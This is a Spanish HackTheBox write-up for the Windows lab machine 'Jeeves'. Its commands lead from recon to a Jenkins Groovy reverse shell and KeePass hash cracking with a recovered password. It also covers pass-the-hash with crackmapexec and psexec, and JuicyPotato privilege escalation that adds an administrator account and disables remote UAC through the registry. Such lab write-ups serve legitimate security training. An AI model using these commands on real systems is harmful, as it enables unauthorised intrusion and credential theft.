# Jeeves

- Dificultad: ⭐️⭐️⭐️⭐️
- Number: 4
- Section: HackTheBox, RedTeam, Windows

<p align="center">
  <img src="https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Jeeves.png" alt="ImagenCustom"/>
</p>

# FOOTHOLD

### PING

- Lo primero que vamos a realizar es un PING para averiguar { en el caso que no lo sepamos } contra que sistema nos enfrentamos.

```bash
$ping 10.10.10.63 -c5                                        
```

```bash
PING 10.10.10.63 (10.10.10.63) 56(84) bytes of data.
64 bytes from 10.10.10.63: icmp_seq=1 ttl=127 time=34.2 ms
64 bytes from 10.10.10.63: icmp_seq=2 ttl=127 time=32.1 ms
64 bytes from 10.10.10.63: icmp_seq=3 ttl=127 time=31.5 ms
64 bytes from 10.10.10.63: icmp_seq=4 ttl=127 time=32.1 ms
64 bytes from 10.10.10.63: icmp_seq=5 ttl=127 time=31.3 ms

--- 10.10.10.63 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4018ms
rtt min/avg/max/mdev = 31.321/32.246/34.175/1.014 ms
```

- ttl=127 → quiere decir que estamos ante un sistema windows { ttl=128 }

### NMAP

```bash
$nmap -sCV --min-rate 2000 -sS -n -p- 10.10.10.63 -v

-n -> para que no aplique resolucion DNS
--min-rate 2000 -> no envie paquetes mas lentos de 2000/s 
-sS -> TCP SYN scan
-Pn -> Port scans only 

-> Ya que estamos en un CTF, queremos realizar un escaneo lo mas rapido posible
		para poder sacar informacion mas rapido. ( genera mucho ruido ).
```

```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-16T20:15:49
|_  start_date: 2022-04-15T15:54:54
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m01s
```

### gobuster

- Para ir ganando tiempo vamos a ir corriendo el **gobuster** para averiguar algún `archivo / directorio` “oculto”.

```bash
$gobuster dir -u [http://10.10.10.63/](http://10.10.10.63/) -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t150 2>/dev/null
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,py,js
[+] Timeout:                 10s
===============================================================
2022/04/16 11:38:05 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 503]
/Index.html           (Status: 200) [Size: 503]
/error.html           (Status: 200) [Size: 50] 
/INDEX.html           (Status: 200) [Size: 503]
/Error.html           (Status: 200) [Size: 50] 
                                               
===============================================================
2022/04/16 11:52:07 Finished
===============================================================
```

- **50000/tcp** → Descubierto con NMAP

```bash
$gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t150
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/16 13:17:08 Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
                                                                                       
===============================================================
2022/04/16 13:18:56 Finished
===============================================================
```

### whatweb

- Lanzamos `whatweb` para poder sacar alguna información extra { version, tecnología etc } y a partir de ella buscar algún posible exploit , en el caso que lo tenga.

```bash
$whatweb http://10.10.10.63/
```

```bash
http://10.10.10.63/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]
```

# USER

### WEB —> Puerto 80

- Nos encontramos un simple buscador.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled.png)
    
- Busquemos lo que busquemos nos sale el `PNG` con el `MSG` de error.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%201.png)
    
- Buscando en internet, encuentras facilmente que el error que se refleja en la imagen es un posible vector de entrada para explotar via una Blind SQL injection. { Microsoft SQL Server 2005 }
    
    [You Injected What? Where?](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/you-injected-what-where/)
    
    ```bash
    ' union select @@version;-- { default query }
    ```
    
- En este punto, seguramente nos encontremos ante un `Rabbit Hole`, ya que todos los enlaces que tenemos en la pagina son a nivel de cliente ( **#** ) y el error no es mas que un redirect a un `PNG`, no es un error de lógica del `BackEnd` como tal.

### WEB —> Puerto 50000

- Aparentemente en la pagina principal no tenemos absolutamente nada.

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%202.png)

- Un link que nos lleva a la típica pagina de información.

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%203.png)

- Gobuster descubrió un directorio oculto: `/askjeeves`
- Accedemos directamente a un panel de control.

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%204.png)

- Investigando un poco encontramos un consola que podemos escribir scripts personalizados.

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%205.png)

- El lenguaje que utiliza es **Groovy**.
- Ejecutamos una reversa para lograr una SHELL a la maquina.

[Groovy Script - Remote Code Execution](https://coldfusionx.github.io/posts/Groovy_RCE/)

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%206.png)

- En la maquina local, ejecutamos `NETCAT` con `RLWRAP` para que, al ser un sistema windows, tengamos una reversa más o menos interactiva.

```bash
rlwrap nc -lvnp 4444
```

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%207.png)

- Una vez dentro accedemos, curiosamente, a un directorio por debajo del Administrator.
- No nos deja acceder a él.

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%208.png)

- Accedemos al directorio raíz para realizar una búsqueda recursiva de la flag user.txt

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%209.png)

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2010.png)

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2011.png)

# ROOT

- En esta máquina tenemos dos opciones diferentes de elevar privilegios.

### Forma 1 —> Cracking KeyPass

- Listamos el contenido del directorio actual, encontramos un par de archivos interesantes:
    - credentials.xml
    - secret.key
    - secret.key.not-so-secret
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2012.png)
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2013.png)
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2014.png)
    

> Spoiler { ninguno sirve de nada } ( por ahora ).
> 
- Realizando un `whoami` vemos que el usuario en el que estamos autenticado es `kohshuke`.
- Buscando un poco encontramos un archivo interesante en su directorio:
    - `CEH.kdbx`
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2015.png)
    
- Haciendo una búsqueda rápida en internet, vemos que esa extension pertenece a un archivo de KeePass.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2016.png)
    
- Para poder operar con este archivo tenemos que pasárnoslo a nuestra máquina local.
- Al estar en un sistema windows, es un poquito mas complicado que abrir un servidor con python y descargando el archivo mediante wget.

> “***Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object-oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.***”
> 
- Vamos a abrir habilitar un recurso a nivel de red a traves de `SMB` para poder pasarnos a nuestra maquina el archivo.
    
    ```bash
    $impacket-smbserver -h
    ```
    
    ```bash
    Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation
    
    usage: smbserver.py [-h] [-comment COMMENT] [-username USERNAME] [-password PASSWORD] [-hashes LMHASH:NTHASH] [-ts] [-debug] [-ip INTERFACE_ADDRESS] [-port PORT] [-smb2support] shareName sharePath
    
    This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. For optional authentication, it is possible to specify username and password or the NTLM hash. Example:
    smbserver.py -comment 'My share' TMP /tmp
    
    positional arguments:
      shareName             name of the share to add
      sharePath             path of the share to add
    
    optional arguments:
      -h, --help            show this help message and exit
      -comment COMMENT      share's comment to display when asked for shares
      -username USERNAME    Username to authenticate clients
      -password PASSWORD    Password for the Username
      -hashes LMHASH:NTHASH
                            NTLM hashes for the Username, format is LMHASH:NTHASH
      -ts                   Adds timestamp to every logging output
      -debug                Turn DEBUG output ON
      -ip INTERFACE_ADDRESS, --interface-address INTERFACE_ADDRESS
                            ip address of listening interface
      -port PORT            TCP port for listening incoming connections (default 445)
      -smb2support          SMB2 Support (experimental!)
    ```
    
    ```bash
    -> shareName = CarpetaCompartida
    -> sharePath = miPath
    ```
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2017.png)
    
- En nuestra máquina vamos a crear el directorio “miPath”, ya que de `impacket-smbserver` va a descargar ahi el archivo.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2018.png)
    
- Descargamos el archivo { lo copiamos para ser exactos }.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2019.png)
    
- Gracias a los magic numbers podemos comprobar que estábamos en lo cierto.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2020.png)
    
- Nos descargamos `keepassxc` para poder utilizarlo en kali.
    
    ```bash
    sudo apt install keepassxc
    ```
    
- Nos pide una contraseña.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2021.png)
    
- Vamos a utilizar la herramienta `keepass2john`, la cual nos va a proporcionar el hash para posteriormente intentar crackearlo con `john`.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2022.png)
    
    ```bash
    // Fallido \\
    john --wordlist=/usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt hash
    ```
    
    ```bash
    // Bingo \\
    john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hash
    ```
    
    ```bash
    // Contraseña en texto claro \\
    ------> CEH:moonshine1 <------
    ```
    
- Logramos acceso al archivo.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2023.png)
    
- La primera password podemos algo especial, tiene aspecto a un hash de windows.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2024.png)
    
    ```bash
    aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
    
    NT -> Para intentar realizar un Pash The Hash
    			-> e0fb1fb85756c24235ff238cbe81fe00 <-
    ```
    
    > “*Un ataque de pase de hash es un exploit en el que un atacante roba una credencial de usuario con hash y, sin descifrarla, la reutiliza para engañar a un sistema de autenticación para que cree una nueva sesión autenticada en la misma red.”*
    > 
- Vemos que usuarios tenemos en windows.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2025.png)
    
- A través de la herramienta `crackmapexec` y mediante el protocolo `smb`, sabiendo que el usuario `Administrator` esta en el sistema e indicándole el hash extraído antes, vamos a comprobar si podemos utilizar dicho hash para autenticarnos como ese usuario.
    
    ```bash
    crackmapexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'
    ```
    
    - **Pwn3d!**
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2026.png)
    
- Mediante la herramienta `psexec` y a traves del `WORKGROUP` y con el usuario y hash anterior vamos a ejecutar una shell de sistema privilegiada.
    
    ```bash
    psexec.py WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
    ```
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2027.png)
    
- Nos dirigimos al escritorio del usuario y nos encontramos un archivo .txt.
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2028.png)
    
- Cuando printeamos el archivo nos dice que miremos “ mas al fondo “.
- Este artículo explica muy bien lo que esta ocurriendo:
    
    [How to Hide Data in a Secret Text File Compartment](https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/)
    
    ```bash
    C:\Users\Administrator\Desktop> dir /r /s 
     Volume in drive C has no label.
     Volume Serial Number is BE50-B1C9
    
     Directory of C:\Users\Administrator\Desktop
    
    11/08/2017  10:05 AM    <DIR>          .
    11/08/2017  10:05 AM    <DIR>          ..
    12/24/2017  03:51 AM                36 hm.txt
                                        34 hm.txt:root.txt:$DATA
    11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
                   2 File(s)            833 bytes
    
         Total Files Listed:
                   2 File(s)            833 bytes
                   2 Dir(s)   7,321,821,184 bytes free
    ```
    
- Mediante el comando more printeamos el archivo oculto dentro de hm.txt.
    
    ```bash
    more < hm.txt:root.txt
    ```
    
- Tenemos la flag del ROOT:
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2029.png)
    

### Forma 2 —> Potato Attack { OSCP STYLE }

- Vamos a comenzar listando los permisos que tiene el usuario.
    
    ```bash
    whoami /priv
    ```
    
- Podemos ver que tenemos `Enable` el **Privilege Name** `SeImpersonatePrivilege`.
    
    ```bash
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                Description                               State   
    ============================= ========================================= ========
    SeShutdownPrivilege           Shut down the system                      Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
    SeUndockPrivilege             Remove computer from docking station      Disabled
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege       Create global objects                     Enabled 
    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
    SeTimeZonePrivilege           Change the time zone                      Disabled
    ```
    
- Lo que nos quiere decir esto es que vamos a poder utilizar ejecutables al nivel de privilegios de SYSTEM.
    
    [Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato](https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/)
    
- Vamos a crear un recurso a nivel de red para pasarnos de nuestra maquina local al windows la herramienta JuicyPotato { el ejecutable por el cual vamos a ejecutar comandos como si fuésemos un usuario privilegiado }.
    
    https://github.com/ohpe/juicy-potato
    
    ```bash
    $impacket-smbserver carpetaCompartida $(pwd)
    ```
    
    ```bash
    $cd C:\Windows\Temp
    $mkdir privesc
    ```
    
    ```bash
    $copy \\10.10.14.17\carpetaCompartida\JuicyPotato.exe potato.exe
    ```
    
- Opciones del ejecutable:
    
    ```bash
    potato.exe -h
    JuicyPotato v0.1 
    
    Mandatory args: 
    -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
    -p <program>: program to launch
    -l <port>: COM server listen port
    
    Optional args: 
    -m <ip>: COM server listen address (default 127.0.0.1)
    -a <argument>: command line argument to pass to program (default NULL)
    -k <ip>: RPC server ip address (default 127.0.0.1)
    -n <port>: RPC server listen port (default 135)
    -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
    -z only test CLSID and print token's user
    ```
    
    ```bash
    $potato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user helix helix123#$ /add" -l 9999
    ```
    
    ```bash
    -t 
    -p -> va a ejecutar una cmd para poder ejecutar comandos
    -a -> argumentos que le vamos a pasar al proceso anterior { cmd }
    
    // Entre las " " \\
    /c -> comando que se va a ejecutar { cmd argument } 
    --> Crear un usuario "helix" con la password "helix123#$"
    		--> Es importante dar a la password un pequeño nivel de complejidad
    				porque puede ser motivo de fallo.
    ```
    
    ![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2030.png)
    
- Como vemos hemos creado el usuario `helix` en el sistema.
    
    ```bash
    net user
    
    User accounts for \\JEEVES
    
    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    helix                    kohsuke                  
    The command completed successfully.
    ```
    
- Con `crackmapexec` comprobamos si el usuario `helix` es válido en el sistema.
    
    ```bash
    crackmapexec smb 10.10.10.63 -u "helix" -p  "helix123#$"
    ```
    
    ```bash
    SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
    SMB         10.10.10.63     445    JEEVES           [+] Jeeves\helix:helix123#$
    ```
    
- Nos da el + asique guay, pero estamos buscando que nos ponga también `Pwnd3!`, lo que significa que es un usuario privilegiado.
- Añadimos al usuario `helix` al grupo `Administrator`.
    
    ```bash
    potato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators helix /add" -l 9999
    ```
    
    ```bash
    $net user helix
    
    User name                    helix
    Full Name                    
    Comment                      
    User's comment               
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never
    
    Password last set            4/17/2022 8:46:04 PM
    Password expires             Never
    Password changeable          4/17/2022 8:46:04 PM
    Password required            Yes
    User may change password     Yes
    
    Workstations allowed         All
    Logon script                 
    User profile                 
    Home directory               
    Last logon                   4/17/2022 8:49:01 PM
    
    Logon hours allowed          All
    
    Local Group Memberships      *Administrators       *Users                
    Global Group memberships     *None                 
    The command completed successfully.
    ```
    
- Por ultimo nos faltaría retocar un ultimo componente del registro `LocalAccountTokenFilterPolicy`.

> *It should be noted that in order for the psexec to work the account needs to be part of the local administrator group and remote user account control should be disabled. This is governed by the “LocalAccountTokenFilterPolicy
” registry key which needs to be present on the system and to have a value of “1” (disabled).*
> 

```bash
potato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 9999
```

```bash
crackmapexec smb 10.10.10.63 -u "helix" -p  "helix123#$"

SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\helix:helix123#$ (Pwn3d!)
```

- Mediante `psexec` nos conectamos a nuestro nuevo usuario privilegiado con su password anteriormente establecida.

```bash
psexec.py WORKGROUP/helix@10.10.10.63 cmd.exe
```

![Untitled](https://github.com/Hexix23/WriteUps/blob/main/.gitbook/assets/Jeeves/Untitled%2031.png)
